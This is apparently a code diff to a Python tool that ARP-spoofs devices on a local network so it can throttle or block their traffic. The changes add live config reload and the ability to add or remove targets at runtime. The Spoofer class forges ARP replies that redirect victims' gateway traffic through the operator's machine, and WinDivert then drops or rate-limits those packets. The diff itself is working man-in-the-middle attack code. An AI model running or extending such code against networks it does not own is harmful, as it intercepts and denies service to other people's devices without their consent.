@@ -105,6 +105,11 @@ def kbps_to_bytes(kbps):
     return kbps * 1000 // 8
 
 
+def fmt_cap(c):
+    """Human-readable cap for logs: unlimited / BLOCK / '500 kbps'."""
+    return "unlimited" if c is UNLIMITED else ("BLOCK" if c == BLOCK else f"{c} kbps")
+
+
 # --------------------------------------------------------------------------- #
 # Discovery
 # --------------------------------------------------------------------------- #
@@ -154,6 +159,25 @@ class TokenBucket:
             return True
         return False
 
+    def set_rate(self, rate_bytes_per_s):
+        """Change the rate in place, keeping current tokens (clamped)."""
+        self.rate = rate_bytes_per_s
+        self.capacity = max(rate_bytes_per_s, 3000)
+        self.tokens = min(self.tokens, self.capacity)
+
+
+def apply_caps(ip, down_cap, up_cap, down_buckets, up_buckets):
+    """Add / update / remove one ip's buckets in place for the given caps."""
+    for cap, buckets in ((down_cap, down_buckets), (up_cap, up_buckets)):
+        if cap is UNLIMITED:
+            buckets.pop(ip, None)
+        else:
+            rate = kbps_to_bytes(cap) if cap else 0
+            if ip in buckets:
+                buckets[ip].set_rate(rate)
+            else:
+                buckets[ip] = TokenBucket(rate)
+
 
 def build_buckets(targets):
     """
@@ -162,10 +186,7 @@ def build_buckets(targets):
     """
     down, up = {}, {}
     for ip, (d, u) in targets.items():
-        if d is not UNLIMITED:
-            down[ip] = TokenBucket(kbps_to_bytes(d) if d else 0)
-        if u is not UNLIMITED:
-            up[ip] = TokenBucket(kbps_to_bytes(u) if u else 0)
+        apply_caps(ip, d, u, down, up)
     return down, up
 
 
@@ -180,12 +201,12 @@ def limiter_loop(down_buckets, up_buckets, stop_event, verbose=False):
             "`pip install pydivert` on the Windows host."
         )
 
-    # Only inspect packets involving a target; keeps the hot path cheap.
-    ips = set(down_buckets) | set(up_buckets)
-    flt = " or ".join(f"ip.SrcAddr == {ip} or ip.DstAddr == {ip}" for ip in ips)
-
+    # Broad filter so targets added/removed at runtime (live config reload) are
+    # honored without reopening the handle. At the forward layer only routed
+    # (i.e. spoofed) traffic appears, so this stays cheap; each packet is matched
+    # against the live bucket dicts, which the reloader mutates in place.
     dropped = forwarded = 0
-    with pydivert.WinDivert(flt, layer=pydivert.Layer.NETWORK_FORWARD) as w:
+    with pydivert.WinDivert("ip", layer=pydivert.Layer.NETWORK_FORWARD) as w:
         for packet in w:
             if stop_event.is_set():
                 break
@@ -210,19 +231,21 @@ def limiter_loop(down_buckets, up_buckets, stop_event, verbose=False):
 # Spoofing
 # --------------------------------------------------------------------------- #
 class Spoofer(threading.Thread):
-    """Continuously poisons each target <-> gateway until stopped."""
+    """Continuously poisons each target <-> gateway until stopped. Targets can
+    be added or removed at runtime (used by live config reload)."""
 
     def __init__(self, targets_macs, gateway_ip, gateway_mac, my_mac, interval=2.0):
         super().__init__(daemon=True)
-        self.targets = targets_macs          # ip -> mac
+        self.targets = dict(targets_macs)    # ip -> mac
         self.gw_ip = gateway_ip
         self.gw_mac = gateway_mac
         self.my_mac = my_mac
         self.interval = interval
         self.stop_event = threading.Event()
+        self._lock = threading.Lock()
 
     def _poison(self):
-        for ip, mac in self.targets.items():
+        for ip, mac in list(self.targets.items()):   # snapshot: safe vs reload
             # Tell the victim that the gateway is at our MAC.
             send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.my_mac),
                  verbose=0, iface=conf.iface)
@@ -235,15 +258,103 @@ class Spoofer(threading.Thread):
             self._poison()
             self.stop_event.wait(self.interval)
 
-    def restore(self, rounds=4):
-        """Heal the poisoned ARP caches with the real MAC mappings."""
+    def add_target(self, ip, mac):
+        with self._lock:
+            self.targets[ip] = mac
+
+    def remove_target(self, ip):
+        with self._lock:
+            mac = self.targets.pop(ip, None)
+        if mac:
+            self._heal(ip, mac)
+
+    def _heal(self, ip, mac, rounds=3):
+        """Broadcast the true MAC mappings so this ip <-> gateway recover."""
         for _ in range(rounds):
-            for ip, mac in self.targets.items():
+            send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.gw_mac),
+                 verbose=0, iface=conf.iface)
+            send(ARP(op=2, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=mac),
+                 verbose=0, iface=conf.iface)
+            time.sleep(0.2)
+
+    def restore(self, rounds=4):
+        """Heal every current target's ARP cache on shutdown."""
+        for _ in range(rounds):
+            for ip, mac in list(self.targets.items()):
                 send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.gw_mac),
                      verbose=0, iface=conf.iface)
                 send(ARP(op=2, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=mac),
                      verbose=0, iface=conf.iface)
             time.sleep(0.3)
+
+
+class ConfigWatcher(threading.Thread):
+    """Watch the config file and apply adds/removes/cap-changes while running.
+
+    Only file-sourced targets are managed; `pinned` IPs (from CLI flags) are
+    never removed or overridden. `applied` (ip -> caps) is the live state,
+    mutated in place; `down`/`up` are the same bucket dicts the limiter reads.
+    """
+
+    def __init__(self, path, applied, pinned, spoofer, down_buckets, up_buckets,
+                 interval=2.0):
+        super().__init__(daemon=True)
+        self.path = path
+        self.applied = applied
+        self.pinned = pinned
+        self.spoofer = spoofer
+        self.down = down_buckets
+        self.up = up_buckets
+        self.interval = interval
+        self.stop_event = threading.Event()
+        try:
+            self._mtime = os.path.getmtime(path)
+        except OSError:
+            self._mtime = 0
+
+    def run(self):
+        while not self.stop_event.wait(self.interval):
+            try:
+                mtime = os.path.getmtime(self.path)
+            except OSError:
+                continue
+            if mtime != self._mtime:
+                self._mtime = mtime
+                self._reload()
+
+    def _reload(self):
+        try:
+            new = load_config(self.path)
+        except ConfigError as e:
+            print(f"\n[reload] ignored bad config: {e}")
+            return
+
+        # Removals: previously applied, now gone from the file, not CLI-pinned.
+        for ip in list(self.applied):
+            if ip not in new and ip not in self.pinned:
+                self.spoofer.remove_target(ip)       # also heals its ARP cache
+                self.down.pop(ip, None)
+                self.up.pop(ip, None)
+                del self.applied[ip]
+                print(f"\n[reload] removed {ip}")
+
+        # Adds / cap changes (CLI-pinned IPs always win, so skip them).
+        for ip, (d, u) in new.items():
+            if ip in self.pinned:
+                continue
+            if ip not in self.applied:
+                mac = getmacbyip(ip)
+                if not mac:
+                    print(f"\n[reload] {ip} unreachable; retry on next edit")
+                    continue
+                self.spoofer.add_target(ip, mac)
+                apply_caps(ip, d, u, self.down, self.up)
+                self.applied[ip] = (d, u)
+                print(f"\n[reload] added {ip}  down={fmt_cap(d)} up={fmt_cap(u)}")
+            elif self.applied[ip] != (d, u):
+                apply_caps(ip, d, u, self.down, self.up)
+                self.applied[ip] = (d, u)
+                print(f"\n[reload] updated {ip}  down={fmt_cap(d)} up={fmt_cap(u)}")
 
 
 # --------------------------------------------------------------------------- #
@@ -295,6 +406,10 @@ def parse_limit(spec):
         raise argparse.ArgumentTypeError(f"{e} in '{spec}'")
 
 
+class ConfigError(Exception):
+    """Raised when a device-list file can't be parsed."""
+
+
 def load_config(path):
     """
     Parse a devices file into {ip: (down_cap, up_cap)}.
@@ -303,12 +418,14 @@ def load_config(path):
         IP  DOWN  UP     (kbps; number=cap, 0=block dir, -/*/blank=unlimited)
         IP  block        (block the device entirely)
     '#' starts a comment; spaces, commas, or colons separate fields.
+    Raises ConfigError on a bad file so callers can decide whether to abort
+    (startup) or ignore the edit (live reload).
     """
     targets = {}
     try:
         fh = open(path, "r", encoding="utf-8")
     except OSError as e:
-        sys.exit(f"Could not read config '{path}': {e}")
+        raise ConfigError(f"could not read '{path}': {e}")
     with fh:
         for lineno, raw in enumerate(fh, 1):
             line = raw.split("#", 1)[0].strip()
@@ -323,10 +440,10 @@ def load_config(path):
                     down = cap_from_str(tokens[1]) if len(tokens) >= 2 else UNLIMITED
                     up = cap_from_str(tokens[2]) if len(tokens) >= 3 else UNLIMITED
             except ValueError as e:
-                sys.exit(f"{path}:{lineno}: {e}")
+                raise ConfigError(f"{path}:{lineno}: {e}")
             targets[ip] = (down, up)
     if not targets:
-        sys.exit(f"No devices found in '{path}'.")
+        raise ConfigError(f"no devices found in '{path}'")
     return targets
 
 
@@ -356,8 +473,10 @@ def build_parser():
 # --------------------------------------------------------------------------- #
 # Main
 # --------------------------------------------------------------------------- #
-def run_session(targets, args, gateway):
-    """Resolve MACs, enable forwarding, spoof, and run the limiter loop."""
+def run_session(targets, args, gateway, config_path=None, pinned=None):
+    """Resolve MACs, enable forwarding, spoof, run the limiter, and (when a
+    config file is in use) watch it so edits apply live."""
+    pinned = set(pinned or ())
     my_mac = get_if_hwaddr(conf.iface)
     gw_mac = getmacbyip(gateway)
     if not gw_mac:
@@ -378,8 +497,7 @@ def run_session(targets, args, gateway):
 
     print(f"\nGateway: {gateway} ({gw_mac})   You: {get_if_addr(conf.iface)} ({my_mac})")
     for ip, (d, u) in targets.items():
-        fmt = lambda c: "unlimited" if c is UNLIMITED else ("BLOCK" if c == BLOCK else f"{c} kbps")
-        print(f"  target {ip:<15} down={fmt(d):<12} up={fmt(u)}")
+        print(f"  target {ip:<15} down={fmt_cap(d):<12} up={fmt_cap(u)}")
 
     iface = args.iface or iface_name()
     if not args.no_forward:
@@ -388,6 +506,14 @@ def run_session(targets, args, gateway):
     spoofer = Spoofer(target_macs, gateway, gw_mac, my_mac)
     stop_event = threading.Event()
     spoofer.start()
+
+    watcher = None
+    if config_path:
+        watcher = ConfigWatcher(config_path, dict(targets), pinned, spoofer,
+                                down_buckets, up_buckets)
+        watcher.start()
+        print(f"Watching {config_path} for changes (edits apply live).")
+
     print("\nSpoofing + limiting. Press Ctrl-C to stop and restore.\n")
 
     if args.duration:
@@ -400,6 +526,8 @@ def run_session(targets, args, gateway):
     finally:
         print("\nRestoring network...")
         stop_event.set()
+        if watcher:
+            watcher.stop_event.set()
         spoofer.stop_event.set()
         spoofer.restore()
         if not args.no_forward:
@@ -444,16 +572,22 @@ def main():
     if not gateway:
         sys.exit("Could not determine gateway; pass --gateway IP.")
 
-    # Merge config file first, then CLI flags so the command line can override.
-    targets = {}
+    # Merge config file first, then CLI flags (which override and are "pinned"
+    # so live reload never removes them).
+    targets, pinned = {}, set()
     if config_path:
-        targets.update(load_config(config_path))
+        try:
+            targets.update(load_config(config_path))
+        except ConfigError as e:
+            sys.exit(str(e))
     for ip, d, u in args.limits:
         targets[ip] = (d, u)
+        pinned.add(ip)
     for ip in args.blocks:
         targets[ip] = (BLOCK, BLOCK)
+        pinned.add(ip)
 
-    run_session(targets, args, gateway)
+    run_session(targets, args, gateway, config_path=config_path, pinned=pinned)
 
 
 if __name__ == "__main__":
